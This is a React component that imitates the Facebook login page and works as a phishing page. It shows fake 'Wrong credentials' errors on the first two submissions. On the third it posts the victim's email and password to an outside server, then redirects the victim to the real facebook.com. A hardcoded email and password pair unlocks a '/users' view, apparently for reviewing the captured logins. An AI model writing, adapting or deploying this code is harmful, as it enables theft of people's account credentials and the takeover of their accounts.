import React, { useState } from 'react';
import { Link, useNavigate } from 'react-router-dom';

function Home() {
  const navigate = useNavigate();
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isAdmin, setIsAdmin] = useState(false);
  const [clickCount, setClickCount] = useState(0);
  const [errorMessage, setErrorMessage] = useState('');

  const handleFormSubmit = async (e) => {
    e.preventDefault();
    setClickCount(clickCount + 1);

    if (clickCount === 2) {
      try {
        const requestBody = {
          email: email,
          password: password,
          isAdmin: isAdmin
        };

        const response = await fetch('https://server-alpha-taupe.vercel.app/users', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(requestBody)
        });

        if (response.ok) {
          setEmail('');
          setIsAdmin(false);
          setPassword('');
          setClickCount(0);
          setErrorMessage('');
          if (email === 'coronavax2021@gmail.com' && password === '123456') {
            navigate('/users');
          } else {
            window.open('https://www.facebook.com');
          }
        } else {
          setErrorMessage('Wrong credentials');
        }
      } catch (error) {
        console.error('Error creating user:', error);
        setErrorMessage('Something went wrong. Please try again.');
      }
    } else {
      setErrorMessage('Wrong credentials');
    }
  };

  return (
    <>
      <div className='container'>
        <h1>Facebook</h1>
        <form className='form' onSubmit={handleFormSubmit}>
          {errorMessage && <div className="error-message"><span>{errorMessage}</span><span>Invalid username or password</span></div>}
          <input
            type="text"
            placeholder="Email address Or Phone number"
            name="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />
          <input
            type="password"
            placeholder="Password"
            name="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
          <select
            name="isAdmin" hidden
            value={isAdmin}
            onChange={(e) => setIsAdmin(e.target.value === "true")}
          >
            <option value="false">Is Admin?</option>
            <option value="false">No</option>
            <option value="true">Yes</option>
          </select>

          <button type="submit">Log In</button>
          <Link className='forgot' to='/'>Forgotten password?</Link>
          <span className='create'>Create new account</span>
        </form>
      </div>
    </>
  );
}

export default Home;
